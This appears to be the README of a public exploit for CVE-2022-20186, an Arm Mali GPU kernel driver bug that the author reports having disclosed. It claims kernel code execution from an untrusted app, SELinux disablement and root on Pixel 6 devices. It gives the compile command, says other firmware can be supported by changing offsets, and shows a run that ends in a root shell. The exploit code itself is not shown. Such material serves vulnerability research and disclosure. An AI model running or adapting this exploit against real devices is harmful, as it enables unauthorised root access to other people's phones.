## Exploit for CVE-2022-20186

The write up can be found [here](https://github.blog/2022-07-27-corrupting-memory-without-memory-corruption/). This is a bug in the Arm Mali kernel driver that I reported in January 2022. The bug can be used to gain arbitrary kernel code execution from the untrusted app domain, which is then used to disable SELinux and gain root.

The exploit is tested on the Google Pixel 6 and supports patch levels from Novmember 2021 to Feburary 2022. It is easy to add support for other firmware by changing a few image offsets. For reference, I used the following command to compile with clang in ndk-21:

```
android-ndk-r21d-linux-x86_64/android-ndk-r21d/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android30-clang mali_alias.c -o mali_alias
```

The exploit rarely fails and can be retried without crashing the device. If successful, it should disable SELinux and gain root.

```
oriole:/ $ /data/local/tmp/mali_alias                                                                                             
fingerprint: google/oriole/oriole:12/SQ1D.220205.004/8151327:user/release-keys
tracking page 0x6ff794e000
drain 0x6d5b200000
gpu_va[0] 6ff6698000
gpu_va[1] 6ff6695000
alias 0x6ff6693000
overwrite addr : 6ff370051c 51c
overwrite addr : 6de310051c 51c
overwrite addr : 6d5f30051c 51c
overwrite addr : 6d5f10051c 51c
overwrite addr : 6d5f30051c 51c
overwrite addr : 6d5f10051c 51c
result 50
overwrite addr : 6ff370051c 51c
overwrite addr : 6de310051c 51c
overwrite addr : 6d5f30051c 51c
overwrite addr : 6d5f10051c 51c
overwrite addr : 6d5f30051c 51c
overwrite addr : 6d5f10051c 51c
result 50
oriole:/ # 
```
